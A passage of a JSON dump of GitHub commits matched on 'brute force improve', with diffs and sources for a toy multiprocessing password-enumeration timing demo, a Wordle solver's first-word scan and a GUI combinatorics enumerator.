{bf_request_queue.qsize()}\")","        print(f\"response: {bf_response_queue.qsize()}\")","        print(f\"terminate: {bf_terminate_queue.qsize()}\")"],"goodparts":["        print(\"\\nQueues:\")","        print(f\"-- request: {bf_request_queue.qsize()}\")","        print(f\"-- response: {bf_response_queue.qsize()}\")","        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")"]}],"source":"\nimport itertools from time import time, sleep import argparse from multiprocessing import Process, Queue parser=argparse.ArgumentParser(description=\"Number of processes for brute force\") parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\") args=parser.parse_args() num_processes=int(args.processes) import psutil print(f\"number of cores:{psutil.cpu_count()}\") def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue): while True: print(f\"oooo waiting for message\") check_info=bf_request_queue.get() print(f\"---> received message from queue:{check_info}\") first_char=check_info[\"first_char\"] chars=check_info[\"chars\"] pw_length=check_info[\"pw_length\"] actual_password=check_info[\"actual_password\"] for next_chars in itertools.product(chars, repeat=pw_length-1): test_password=first_char +''.join(next_chars) if test_password==actual_password: bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()}) break if not bf_terminate_queue.empty(): print(f\"~~~~[{first_char}] terminating as requested\") bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None}) break else: print(f\"---![{first_char}] password not found\") bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None}) def main(): bf_request_queue=Queue() bf_response_queue=Queue() bf_terminate_queue=Queue() chars=\"0123456789\" bf_processes=list() for proc_num in range(0, num_processes): print(f\"---> starting process number{proc_num}\") proc=Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue)) proc.start() print(f\"---> process number{proc_num} started\") bf_processes.append(proc) while True: password=input(\"Password: \") if not password: exit() time_start=time() for char in chars: check_info=dict() check_info[\"first_char\"]=char check_info[\"chars\"]=chars check_info[\"pw_length\"]=len(password) check_info[\"actual_password\"]=password print(f\"---> putting message for char:{char} onto queue:{check_info}\") bf_request_queue.put(check_info) for _ in chars: rsp_info=bf_response_queue.get() if rsp_info[\"found\"]: print(f\"---> FOUND PASSWORD:{rsp_info['pw']}\") print(f\"found password in{rsp_info['time']-time_start:.3f}\") break else: print(f\"---! PASSWORD NOT FOUND:{password}\") bf_terminate_queue.put({}) sleep(1) for queue in[bf_request_queue, bf_response_queue, bf_terminate_queue]: while not queue.empty(): queue.get() print(f\"request:{bf_request_queue.qsize()}\") print(f\"response:{bf_response_queue.qsize()}\") print(f\"terminate:{bf_terminate_queue.qsize()}\") if __name__=='__main__': main() ","sourceWithComments":"import itertools\nfrom time import time, sleep\nimport argparse\nfrom multiprocessing import Process, Queue\n\nparser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\nparser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\nargs = parser.parse_args()\nnum_processes = int(args.processes)\n\nimport psutil\nprint(f\"number of cores: {psutil.cpu_count()}\")\n\n\ndef check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n\n    while True:\n\n        print(f\"oooo waiting for message\")\n        check_info = bf_request_queue.get()\n        print(f\"---> received message from queue: {check_info}\")\n\n        first_char = check_info[\"first_char\"]\n        chars = check_info[\"chars\"]\n        pw_length = check_info[\"pw_length\"]\n        actual_password = check_info[\"actual_password\"]\n\n        for next_chars in itertools.product(chars, repeat=pw_length-1):\n            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n            test_password = first_char + ''.join(next_chars)\n            if test_password == actual_password:\n                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n                break\n\n            if not bf_terminate_queue.empty():\n                print(f\"~~~~ [{first_char}] terminating as requested\")\n                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n                break\n\n        else:\n            print(f\"---! [{first_char}] password not found\")\n            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n\n        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n\n\ndef main():\n\n    bf_request_queue = Queue()\n    bf_response_queue = Queue()\n    bf_terminate_queue = Queue()\n\n    chars = \"0123456789\"\n\n    bf_processes = list()\n    for proc_num in range(0, num_processes):\n        print(f\"---> starting process number {proc_num}\")\n        proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n        proc.start()\n        print(f\"---> process number {proc_num} started\")\n        bf_processes.append(proc)\n\n    while True:\n\n        password = input(\"Password:  \")\n        if not password: exit()\n\n        time_start = time()\n        for char in chars:\n\n            check_info = dict()\n            check_info[\"first_char\"] = char\n            check_info[\"chars\"] = chars\n            check_info[\"pw_length\"] = len(password)\n            check_info[\"actual_password\"] = password\n\n            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n            bf_request_queue.put(check_info)\n\n        for _ in chars:\n            rsp_info = bf_response_queue.get()\n\n            if rsp_info[\"found\"]:\n                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n                break\n\n        else:\n            print(f\"---! PASSWORD NOT FOUND: {password}\")\n\n        # put a single terminate message in the queue so all process see it and quit\n        bf_terminate_queue.put({})\n        sleep(1)\n\n        # clear out any excess messages in all the queues\n        for queue in [bf_request_queue, bf_response_queue, bf_terminate_queue]:\n            while not queue.empty():\n                queue.get()\n\n        print(f\"request: {bf_request_queue.qsize()}\")\n        print(f\"response: {bf_response_queue.qsize()}\")\n        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"remove cyan, improve brute_force"}},"https:\/\/github.com\/yotam-gafni\/wordle_solver":{"b34666bc5acfa556216d3d834730e4b4733deee0":{"url":"https:\/\/api.github.com\/repos\/yotam-gafni\/wordle_solver\/commits\/b34666bc5acfa556216d3d834730e4b4733deee0","html_url":"https:\/\/github.com\/yotam-gafni\/wordle_solver\/commit\/b34666bc5acfa556216d3d834730e4b4733deee0","message":"Add a brute-force scan for the first word, to improve overall performance","sha":"b34666bc5acfa556216d3d834730e4b4733deee0","keyword":"brute force improve","diff":"diff --git a\/full_scan.py b\/full_scan.py\nindex 773ac86..41c95f4 100644\n--- a\/full_scan.py\n+++ b\/full_scan.py\n@@ -63,7 +63,7 @@ def calc_response_vector(w1,w2):\n hit_count = 0\n miss_count = 0\n \n-def check_lines(guess_lines, lines, depth, histogram):\n+def check_lines(guess_lines, lines, depth, histogram, start_word):\n     global hit_count\n     global miss_count\n     if len(lines) == 1:\n@@ -76,8 +76,8 @@ def check_lines(guess_lines, lines, depth, histogram):\n     if depth != 0:\n         all_it = guess_lines\n     else:\n-        all_it = guess_lines\n-        #all_it = [\"snare\"]\n+        #all_it = guess_lines\n+        all_it = [start_word]\n \n     for w1 in all_it:\n         rmat = {}\n@@ -135,9 +135,9 @@ def check_lines(guess_lines, lines, depth, histogram):\n     for key in it_keys:\n         elem = newsmat[key]\n         if hard_mode:\n-            max_depth,total_steps_sub = check_lines(elem, elem, depth+1, histo)\n+            max_depth,total_steps_sub = check_lines(elem, elem, depth+1, histo, None)\n         else:\n-            max_depth,total_steps_sub = check_lines(guess_lines, elem, depth+1, histo)\n+            max_depth,total_steps_sub = check_lines(guess_lines, elem, depth+1, histo, None)\n         if Verbose and max_depth > 5 and depth in [2,3]:\n             print(\"Key: {}, depth: {}\".format(key,depth))\n         m = max(m,max_depth)\n@@ -145,7 +145,11 @@ def check_lines(guess_lines, lines, depth, histogram):\n     return (m, total_steps)\n \n histo = defaultdict(int)\n-m = check_lines(all_lines, file_lines, 0, histo)\n-print(\"Max depth encountered: {}\".format(m))\n-print(\"Hits: {}, Misses: {}\".format(hit_count, miss_count))\n-print(histo)\n+for start_w in range(len(all_lines_words)):\n+    m = check_lines(all_lines, file_lines, 0, histo, start_w)\n+    print(\"For word {}: Max depth encountered: {}\".format(all_lines_words[start_w],m))\n+    print(\"Hits: {}, Misses: {}\".format(hit_count, miss_count))\n+    print(histo)\n+    hit_count = 0\n+    miss_count = 0\n+    histo.clear()\n","files":{"\/full_scan.py":{"changes":[{"diff":"\n hit_count = 0\n miss_count = 0\n \n-def check_lines(guess_lines, lines, depth, histogram):\n+def check_lines(guess_lines, lines, depth, histogram, start_word):\n     global hit_count\n     global miss_count\n     if len(lines) == 1:\n","add":1,"remove":1,"filename":"\/full_scan.py","badparts":["def check_lines(guess_lines, lines, depth, histogram):"],"goodparts":["def check_lines(guess_lines, lines, depth, histogram, start_word):"]},{"diff":"\n     if depth != 0:\n         all_it = guess_lines\n     else:\n-        all_it = guess_lines\n-        #all_it = [\"snare\"]\n+        #all_it = guess_lines\n+        all_it = [start_word]\n \n     for w1 in all_it:\n         rmat = {}\n","add":2,"remove":2,"filename":"\/full_scan.py","badparts":["        all_it = guess_lines"],"goodparts":["        all_it = [start_word]"]},{"diff":"\n     for key in it_keys:\n         elem = newsmat[key]\n         if hard_mode:\n-            max_depth,total_steps_sub = check_lines(elem, elem, depth+1, histo)\n+            max_depth,total_steps_sub = check_lines(elem, elem, depth+1, histo, None)\n         else:\n-            max_depth,total_steps_sub = check_lines(guess_lines, elem, depth+1, histo)\n+            max_depth,total_steps_sub = check_lines(guess_lines, elem, depth+1, histo, None)\n         if Verbose and max_depth > 5 and depth in [2,3]:\n             print(\"Key: {}, depth: {}\".format(key,depth))\n         m = max(m,max_depth)\n","add":2,"remove":2,"filename":"\/full_scan.py","badparts":["            max_depth,total_steps_sub = check_lines(elem, elem, depth+1, histo)","            max_depth,total_steps_sub = check_lines(guess_lines, elem, depth+1, histo)"],"goodparts":["            max_depth,total_steps_sub = check_lines(elem, elem, depth+1, histo, None)","            max_depth,total_steps_sub = check_lines(guess_lines, elem, depth+1, histo, None)"]},{"diff":"\n     return (m, total_steps)\n \n histo = defaultdict(int)\n-m = check_lines(all_lines, file_lines, 0, histo)\n-print(\"Max depth encountered: {}\".format(m))\n-print(\"Hits: {}, Misses: {}\".format(hit_count, miss_count))\n-print(histo)\n+for start_w in range(len(all_lines_words)):\n+    m = check_lines(all_lines, file_lines, 0, histo, start_w)\n+    print(\"For word {}: Max depth encountered: {}\".format(all_lines_words[start_w],m))\n+    print(\"Hits: {}, Misses: {}\".format(hit_count, miss_count))\n+    print(histo)\n+    hit_count = 0\n+    miss_count = 0\n+    histo.clear()\n","add":8,"remove":4,"filename":"\/full_scan.py","badparts":["m = check_lines(all_lines, file_lines, 0, histo)","print(\"Max depth encountered: {}\".format(m))","print(\"Hits: {}, Misses: {}\".format(hit_count, miss_count))","print(histo)"],"goodparts":["for start_w in range(len(all_lines_words)):","    m = check_lines(all_lines, file_lines, 0, histo, start_w)","    print(\"For word {}: Max depth encountered: {}\".format(all_lines_words[start_w],m))","    print(\"Hits: {}, Misses: {}\".format(hit_count, miss_count))","    print(histo)","    hit_count = 0","    miss_count = 0","    histo.clear()"]}],"source":"\nfrom functools import lru_cache from collections import defaultdict import math from word_list import poss_words as file_lines_words all_w=open(\"words.txt\",\"r\") all_lines_words=[x.strip() for x in all_w.readlines()] all_lines=range(len(all_lines_words)) file_lines=[all_lines_words.index(x) for x in file_lines_words] hard_mode=False how_deep=0 Verbose=False def msum_to_int(msum): total=0 for i in msum: total=total*3 +i return total def calc_response_vector_slow(w1,w2): w1=all_lines_words[w1] w2=all_lines_words[w2] tw2=str(w2) msum_int=0 msum=[0 for i in range(5)] for c_ind in range(5): if w1[c_ind]==tw2[c_ind]: msum[c_ind]=2 msum_int +=2 *(3**c_ind) tw2=tw2[:c_ind] +\"*\" +tw2[c_ind+1:] for c_ind in range(5): if w1[c_ind] in tw2 and msum[c_ind]==0: msum_int +=1 *(3**c_ind) ind_app=tw2.find(w1[c_ind]) tw2=tw2[:ind_app] +\"*\" +tw2[ind_app+1:] return msum_int print(\"Prepopulation start!\") responseCache={} print(\"Prepopulation done!\") def calc_response_vector(w1,w2): return responseCache[(w1,w2)] global hit_count global miss_count hit_count=0 miss_count=0 def check_lines(guess_lines, lines, depth, histogram): global hit_count global miss_count if len(lines)==1: histo[depth+1] +=1 return(depth+1,depth+1) min_wc=100000 max_entropy=0 chosen_word=\"\" srmat={} if depth !=0: all_it=guess_lines else: all_it=guess_lines for w1 in all_it: rmat={} for w2 in lines: if(w1,w2) in responseCache: msum=responseCache[(w1,w2)] hit_count +=1 else: miss_count +=1 w1_s=all_lines_words[w1] w2_s=all_lines_words[w2] tw2=str(w2_s) msum_int=0 msum_vec=[0 for i in range(5)] for c_ind in range(5): if w1_s[c_ind]==tw2[c_ind]: msum_vec[c_ind]=2 msum_int +=2 *(3**c_ind) tw2=tw2[:c_ind] +\"*\" +tw2[c_ind+1:] for c_ind in range(5): if w1_s[c_ind] in tw2 and msum_vec[c_ind]==0: msum_int +=1 *(3**c_ind) ind_app=tw2.find(w1_s[c_ind]) tw2=tw2[:ind_app] +\"*\" +tw2[ind_app+1:] responseCache[(w1,w2)]=msum_int msum=msum_int if msum not in rmat: rmat[msum]=[w2] else: rmat[msum].append(w2) M=max([len(val) for val in rmat.values()]) dict_len=float(len(lines)) Entropy=-1 * sum([len(val)\/dict_len*math.log(len(val)\/dict_len) for val in rmat.values()]) if Entropy > max_entropy: if Verbose: print(\"M:{},Entropy:{}\".format(M, Entropy)) min_wc=M max_entropy=Entropy chosen_word=w1 srmat=rmat if Verbose: print(\"Min wc:{}, chosen word:{}, depth:{}\".format(min_wc, chosen_word,depth)) newsmat=srmat m=depth total_steps=0 it_keys=newsmat.keys() for key in it_keys: elem=newsmat[key] if hard_mode: max_depth,total_steps_sub=check_lines(elem, elem, depth+1, histo) else: max_depth,total_steps_sub=check_lines(guess_lines, elem, depth+1, histo) if Verbose and max_depth > 5 and depth in[2,3]: print(\"Key:{}, depth:{}\".format(key,depth)) m=max(m,max_depth) total_steps +=total_steps_sub return(m, total_steps) histo=defaultdict(int) m=check_lines(all_lines, file_lines, 0, histo) print(\"Max depth encountered:{}\".format(m)) print(\"Hits:{}, Misses:{}\".format(hit_count, miss_count)) print(histo) ","sourceWithComments":"from functools import lru_cache\nfrom collections import defaultdict\nimport math\n#import numpy\n\n#f = open(\"2500.txt\",\"r\")\n#file_lines = f.readlines()\nfrom word_list import poss_words as file_lines_words\n\nall_w = open(\"words.txt\",\"r\")\nall_lines_words = [x.strip() for x in all_w.readlines()]\n\nall_lines = range(len(all_lines_words))\nfile_lines = [all_lines_words.index(x) for x in file_lines_words]\n\n\nhard_mode = False\n\nhow_deep = 0\n\nVerbose = False\n\ndef msum_to_int(msum):\n    total = 0\n    for i in msum:\n        total = total*3 + i\n    return total\n\n#@lru_cache(maxsize=None)\ndef calc_response_vector_slow(w1,w2):\n    #print(w1)\n    #print(w2)\n    w1 = all_lines_words[w1]\n    w2 = all_lines_words[w2]\n    tw2 = str(w2)\n    msum_int = 0\n    msum = [0 for i in range(5)]\n    for c_ind in range(5):\n        if w1[c_ind] == tw2[c_ind]:\n            msum[c_ind] = 2\n            msum_int += 2 * (3**c_ind)\n            tw2 = tw2[:c_ind] + \"*\" + tw2[c_ind+1:]\n    for c_ind in range(5):\n        if w1[c_ind] in tw2 and msum[c_ind] == 0:\n            #msum[c_ind] = 1\n            msum_int += 1 * (3**c_ind)\n            ind_app = tw2.find(w1[c_ind])\n            tw2 = tw2[:ind_app] + \"*\" + tw2[ind_app+1:]\n    return msum_int #msum_to_int(tuple(msum))\n\n\nprint(\"Prepopulation start!\")\nresponseCache = {} #numpy.zeros((len(all_lines_words),len(all_lines_words)),dtype=numpy.uint8)\n#for i in all_lines:\n#    for j in file_lines:\n#        responseCache[(i,j)] = calc_response_vector_slow(i,j)\nprint(\"Prepopulation done!\")\ndef calc_response_vector(w1,w2):\n    return responseCache[(w1,w2)]\n\nglobal hit_count\nglobal miss_count\nhit_count = 0\nmiss_count = 0\n\ndef check_lines(guess_lines, lines, depth, histogram):\n    global hit_count\n    global miss_count\n    if len(lines) == 1:\n        histo[depth+1] += 1\n        return (depth+1,depth+1)\n    min_wc = 100000\n    max_entropy = 0\n    chosen_word = \"\"\n    srmat = {}\n    if depth != 0:\n        all_it = guess_lines\n    else:\n        all_it = guess_lines\n        #all_it = [\"snare\"]\n\n    for w1 in all_it:\n        rmat = {}\n        for w2 in lines:\n            if (w1,w2) in responseCache:\n                msum = responseCache[(w1,w2)]\n                hit_count += 1\n            else:\n                miss_count += 1\n                w1_s = all_lines_words[w1]\n                w2_s = all_lines_words[w2]\n                tw2 = str(w2_s)\n                msum_int = 0\n                msum_vec = [0 for i in range(5)]\n                for c_ind in range(5):\n                    if w1_s[c_ind] == tw2[c_ind]:\n                        msum_vec[c_ind] = 2\n                        msum_int += 2 * (3**c_ind)\n                        tw2 = tw2[:c_ind] + \"*\" + tw2[c_ind+1:]\n                for c_ind in range(5):\n                    if w1_s[c_ind] in tw2 and msum_vec[c_ind] == 0:\n                        #msum[c_ind] = 1\n                        msum_int += 1 * (3**c_ind)\n                        ind_app = tw2.find(w1_s[c_ind])\n                        tw2 = tw2[:ind_app] + \"*\" + tw2[ind_app+1:]\n                responseCache[(w1,w2)] = msum_int #msum_to_int(tuple(msum))\n                msum = msum_int\n\n\n            if msum not in rmat:\n                rmat[msum] = [w2]\n            else:\n                rmat[msum].append(w2)\n\n        M = max([len(val) for val in rmat.values()])\n        dict_len = float(len(lines))\n        Entropy = -1 * sum([len(val)\/dict_len*math.log(len(val)\/dict_len) for val in rmat.values()])\n        if Entropy > max_entropy:\n        #if M < min_wc:\n            if Verbose:\n                print(\"M:{},Entropy:{}\".format(M, Entropy))\n            min_wc = M\n            max_entropy = Entropy\n            chosen_word = w1\n            srmat = rmat\n    if Verbose:\n        print(\"Min wc: {}, chosen word: {}, depth: {}\".format(min_wc, chosen_word,depth))\n    newsmat = srmat\n    #for sr in srmat:\n    #\tif len(srmat[sr]) > 5 - depth:\n    #\t\tnewsmat[sr] = srmat[sr]\n    m = depth\n    total_steps = 0\n    it_keys = newsmat.keys()\n    for key in it_keys:\n        elem = newsmat[key]\n        if hard_mode:\n            max_depth,total_steps_sub = check_lines(elem, elem, depth+1, histo)\n        else:\n            max_depth,total_steps_sub = check_lines(guess_lines, elem, depth+1, histo)\n        if Verbose and max_depth > 5 and depth in [2,3]:\n            print(\"Key: {}, depth: {}\".format(key,depth))\n        m = max(m,max_depth)\n        total_steps += total_steps_sub\n    return (m, total_steps)\n\nhisto = defaultdict(int)\nm = check_lines(all_lines, file_lines, 0, histo)\nprint(\"Max depth encountered: {}\".format(m))\nprint(\"Hits: {}, Misses: {}\".format(hit_count, miss_count))\nprint(histo)\n"}},"msg":"Add a brute-force scan for the first word, to improve overall performance"}},"https:\/\/github.com\/ginger-with-a-soul\/eXplosion-diffuser":{"be4fca728b8045bb0ef4daa88c3f1f9efc73492d":{"url":"https:\/\/api.github.com\/repos\/ginger-with-a-soul\/eXplosion-diffuser\/commits\/be4fca728b8045bb0ef4daa88c3f1f9efc73492d","html_url":"https:\/\/github.com\/ginger-with-a-soul\/eXplosion-diffuser\/commit\/be4fca728b8045bb0ef4daa88c3f1f9efc73492d","message":"IMPROVED: brute force algorithm; result printing; TODO: progress bar implementation for brute force algorithm","sha":"be4fca728b8045bb0ef4daa88c3f1f9efc73492d","keyword":"brute force improve","diff":"diff --git a\/__pycache__\/bruteforce_iterative.cpython-38.pyc b\/__pycache__\/bruteforce_iterative.cpython-38.pyc\nindex cb9c024..bd4851e 100644\nBinary files a\/__pycache__\/bruteforce_iterative.cpython-38.pyc and b\/__pycache__\/bruteforce_iterative.cpython-38.pyc differ\ndiff --git a\/__pycache__\/ui_code.cpython-38.pyc b\/__pycache__\/ui_code.cpython-38.pyc\nindex 6b09bb9..adf8a29 100644\nBinary files a\/__pycache__\/ui_code.cpython-38.pyc and b\/__pycache__\/ui_code.cpython-38.pyc differ\ndiff --git a\/bruteforce_iterative.py b\/bruteforce_iterative.py\nindex 9e6e640..407c64a 100644\n--- a\/bruteforce_iterative.py\n+++ b\/bruteforce_iterative.py\n@@ -3,18 +3,46 @@\n variations that are k long using n different symbols\n '''\n \n-def generate_all(k, n, output_label, mainwindow, problem):\n+def generate_all(k, n, output_label, mainwindow, problem, num_symbols_map):\n \n \t'''\n \tGenerates all variations starting from all 1s. Variations are\n-\tchanged from back to front\n+\tchanged from back to front.\n+\tConverts problem into [int] representation used for comparison\n+\twith out current variation via fitness function.\n+\tEvery time a better variation is found, it gets printed to UI.\n+\tStops search when match is found.\n \t'''\n+\tnumerical_problem = k * [1]\n+\t\n+\tfor i in range(k):\n+\t\tnumerical_problem[i] = num_symbols_map[problem[i]]\n \n \tcurrent_variation = k * [1]\n+\tcurrent_best_fitness = 0\n \n \texists_next_variation = True\n \twhile(exists_next_variation):\n-\t\t\n+\n+\t\tnew_fitness = fitness(k, current_variation, numerical_problem)\n+\t\tif(new_fitness > current_best_fitness):\n+\t\t\tprint(current_variation)\n+\t\t\tback_to_symbolical = []\n+\t\t\tcurrent_best_fitness = new_fitness\n+\n+\t\t\tfor i in range(k):\n+\t\t\t\tfor (key, value) in num_symbols_map.items():\n+\t\t\t\t\tif value == current_variation[i]:\n+\t\t\t\t\t\tback_to_symbolical.append(key)\n+\n+\t\t\tprint(back_to_symbolical)\n+\t\t\tprint(current_best_fitness)\n+\t\t\toutput_label['text'] = back_to_symbolical\n+\t\t\tmainwindow.update()\n+\n+\t\t\tif(current_best_fitness == k):\n+\t\t\t\tbreak\n+\n \t\tindex = k - 1\n \t\twhile(index >= 0 and current_variation[index] == n):\n \t\t\tcurrent_variation[index] = 1\n@@ -25,5 +53,11 @@ def generate_all(k, n, output_label, mainwindow, problem):\n \t\telse:\n \t\t\tcurrent_variation[index] += 1\n \n-\t\toutput_label['text'] = current_variation\n-\t\tmainwindow.update()\n+\n+def fitness(k, solution, problem):\n+\tfit = 0\n+\tfor i in range(k):\n+\t\tif solution[i] == problem[i]:\n+\t\t\tfit += 1\n+\t\t\t\n+\treturn fit\ndiff --git a\/ui_code.py b\/ui_code.py\nindex 6e34d1c..db0f30b 100644\n--- a\/ui_code.py\n+++ b\/ui_code.py\n@@ -27,6 +27,8 @@ def __init__(self):\n         self.n = 5\n         self.problem = ''\n         self.available_symbols = list(ascii_lowercase) + [str(i) for i in range(10)]\n+        # numerical symbols represent a map of available symbols where keys are numbers used for checking current best solution in algorithms that generate variations with numbers only. Key values start with 1 because our variations start with all 1s and not 0s\n+        self.available_symbols_numerical = {self.available_symbols[i-1] : i for i in range(1, len(self.available_symbols) + 1)}\n         self.output_label = self.builder.get_object('label_current_best_solution')\n         self.current_solution = ''\n         self.builder.get_variable('algo_group').set('1')\n@@ -124,7 +126,7 @@ def start_callback(self):\n         \n         if self.START_FLAG:\n             if self.BRUTEFORCE_FLAG:\n-                bf.generate_all(self.k, self.n, self.output_label, self.mainwindow, self.problem)\n+                bf.generate_all(self.k, self.n, self.output_label, self.mainwindow, self.problem, self.available_symbols_numerical)\n             elif self.MONTECARLO_FLAG:\n                 ...\n             else:\n@@ -257,5 +259,6 @@ def clear_problem_entry(self):\n         problem.delete('0', 'end')\n         self.PROBLEM_FLAG = False\n \n+\n     def run(self):\n         self.mainwindow.mainloop()\n","files":{"\/bruteforce_iterative.py":{"changes":[{"diff":"\n variations that are k long using n different symbols\n '''\n \n-def generate_all(k, n, output_label, mainwindow, problem):\n+def generate_all(k, n, output_label, mainwindow, problem, num_symbols_map):\n \n \t'''\n \tGenerates all variations starting from all 1s. Variations are\n-\tchanged from back to front\n+\tchanged from back to front.\n+\tConverts problem into [int] representation used for comparison\n+\twith out current variation via fitness function.\n+\tEvery time a better variation is found, it gets printed to UI.\n+\tStops search when match is found.\n \t'''\n+\tnumerical_problem = k * [1]\n+\t\n+\tfor i in range(k):\n+\t\tnumerical_problem[i] = num_symbols_map[problem[i]]\n \n \tcurrent_variation = k * [1]\n+\tcurrent_best_fitness = 0\n \n \texists_next_variation = True\n \twhile(exists_next_variation):\n-\t\t\n+\n+\t\tnew_fitness = fitness(k, current_variation, numerical_problem)\n+\t\tif(new_fitness > current_best_fitness):\n+\t\t\tprint(current_variation)\n+\t\t\tback_to_symbolical = []\n+\t\t\tcurrent_best_fitness = new_fitness\n+\n+\t\t\tfor i in range(k):\n+\t\t\t\tfor (key, value) in num_symbols_map.items():\n+\t\t\t\t\tif value == current_variation[i]:\n+\t\t\t\t\t\tback_to_symbolical.append(key)\n+\n+\t\t\tprint(back_to_symbolical)\n+\t\t\tprint(current_best_fitness)\n+\t\t\toutput_label['text'] = back_to_symbolical\n+\t\t\tmainwindow.update()\n+\n+\t\t\tif(current_best_fitness == k):\n+\t\t\t\tbreak\n+\n \t\tindex = k - 1\n \t\twhile(index >= 0 and current_variation[index] == n):\n \t\t\tcurrent_variation[index] = 1\n","add":31,"remove":3,"filename":"\/bruteforce_iterative.py","badparts":["def generate_all(k, n, output_label, mainwindow, problem):","\tchanged from back to front","\t\t"],"goodparts":["def generate_all(k, n, output_label, mainwindow, problem, num_symbols_map):","\tchanged from back to front.","\tConverts problem into [int] representation used for comparison","\twith out current variation via fitness function.","\tEvery time a better variation is found, it gets printed to UI.","\tStops search when match is found.","\tnumerical_problem = k * [1]","\t","\tfor i in range(k):","\t\tnumerical_problem[i] = num_symbols_map[problem[i]]","\tcurrent_best_fitness = 0","\t\tnew_fitness = fitness(k, current_variation, numerical_problem)","\t\tif(new_fitness > current_best_fitness):","\t\t\tprint(current_variation)","\t\t\tback_to_symbolical = []","\t\t\tcurrent_best_fitness = new_fitness","\t\t\tfor i in range(k):","\t\t\t\tfor (key, value) in num_symbols_map.items():","\t\t\t\t\tif value == current_variation[i]:","\t\t\t\t\t\tback_to_symbolical.append(key)","\t\t\tprint(back_to_symbolical)","\t\t\tprint(current_best_fitness)","\t\t\toutput_label['text'] = back_to_symbolical","\t\t\tmainwindow.update()","\t\t\tif(current_best_fitness == k):","\t\t\t\tbreak"]},{"diff":"\n \t\telse:\n \t\t\tcurrent_variation[index] += 1\n \n-\t\toutput_label['text'] = current_variation\n-\t\tmainwindow.update()\n+\n+def fitness(k, solution, problem):\n+\tfit = 0\n+\tfor i in range(k):\n+\t\tif solution[i] == problem[i]:\n+\t\t\tfit += 1\n+\t\t\t\n+\treturn f","add":8,"remove":2,"filename":"\/bruteforce_iterative.py","badparts":["\t\toutput_label['text'] = current_variation","\t\tmainwindow.update()"],"goodparts":["def fitness(k, solution, problem):","\tfit = 0","\tfor i in range(k):","\t\tif solution[i] == problem[i]:","\t\t\tfit += 1","\t\t\t","\treturn f"]}],"source":"\n''' Iterative bruteforce algorithm for generating all variations that are k long using n different symbols ''' def generate_all(k, n, output_label, mainwindow, problem): \t''' \tGenerates all variations starting from all 1s. Variations are \tchanged from back to front \t''' \tcurrent_variation=k *[1] \texists_next_variation=True \twhile(exists_next_variation): \t\t \t\tindex=k -1 \t\twhile(index >=0 and current_variation[index]==n): \t\t\tcurrent_variation[index]=1 \t\t\tindex -=1 \t\tif index < 0: \t\t\texists_next_variation=False \t\telse: \t\t\tcurrent_variation[index] +=1 \t\toutput_label['text']=current_variation \t\tmainwindow.update() ","sourceWithComments":"'''\nIterative bruteforce algorithm for generating all \nvariations that are k long using n different symbols\n'''\n\ndef generate_all(k, n, output_label, mainwindow, problem):\n\n\t'''\n\tGenerates all variations starting from all 1s. Variations are\n\tchanged from back to front\n\t'''\n\n\tcurrent_variation = k * [1]\n\n\texists_next_variation = True\n\twhile(exists_next_variation):\n\t\t\n\t\tindex = k - 1\n\t\twhile(index >= 0 and current_variation[index] == n):\n\t\t\tcurrent_variation[index] = 1\n\t\t\tindex -= 1\n\n\t\tif index < 0:\n\t\t\texists_next_variation = False\n\t\telse:\n\t\t\tcurrent_variation[index] += 1\n\n\t\toutput_label['text'] = current_variation\n\t\tmainwindow.update()\n"},"\/ui_code.py":{"changes":[{"diff":"\n         \n         if self.START_FLAG:\n             if self.BRUTEFORCE_FLAG:\n-                bf.generate_all(self.k, self.n, self.output_label, self.mainwindow, self.problem)\n+                bf.generate_all(self.k, self.n, self.output_label, self.mainwindow, self.problem, self.available_symbols_numerical)\n             elif self.MONTECARLO_FLAG:\n                 ...\n             else:\n","add":1,"remove":1,"filename":"\/ui_code.py","badparts":["                bf.generate_all(self.k, self.n, self.output_label, self.mainwindow, self.problem)"],"goodparts":["                bf.generate_all(self.k, self.n, self.output_label, self.mainwindow, self.problem, self.available_symbols_numerical)"]}],"source":"\nimport os import pygubu import tkinter as tk import tkinter.ttk as ttk import psutil from random import choices from string import ascii_lowercase import bruteforce_iterative as bf PROJECT_PATH=os.path.dirname(__file__) PROJECT_UI=os.path.join(PROJECT_PATH, \"ui.ui\") class UiApp: def __init__(self): self.builder=builder=pygubu.Builder() builder.add_resource_path(PROJECT_PATH) builder.add_from_file(PROJECT_UI) self.mainwindow=builder.get_object('mainwindow') builder.connect_callbacks(self) self.theme() self.k=5 self.n=5 self.problem='' self.available_symbols=list(ascii_lowercase) +[str(i) for i in range(10)] self.output_label=self.builder.get_object('label_current_best_solution') self.current_solution='' self.builder.get_variable('algo_group').set('1') self.builder.get_variable('gene_group').set('-1') self.initialize_flags() self.show_resource_usage() self.bind_validation() def initialize_flags(self): ''' Initializes flags used to communicate frontend and backend states. Initially, size, number, genetic and tournamet flags are True because they have a valid default state. ''' self.MUTATION_FLAG=True self.PROBLEM_FLAG=False self.SIZE_FLAG=True self.START_FLAG=False self.NUMBER_FLAG=True self.BRUTEFORCE_FLAG=True self.MONTECARLO_FLAG=False self.GENETIC_FLAG=False self.ROULETTE_FLAG=False self.TOURNAMENT_FLAG=False def theme(self): self.theme_abs_path=os.path.abspath('awthemes-10.2.1') self.mainwindow.tk.call('lappend', 'auto_path', self.theme_abs_path) self.mainwindow.tk.call('package', 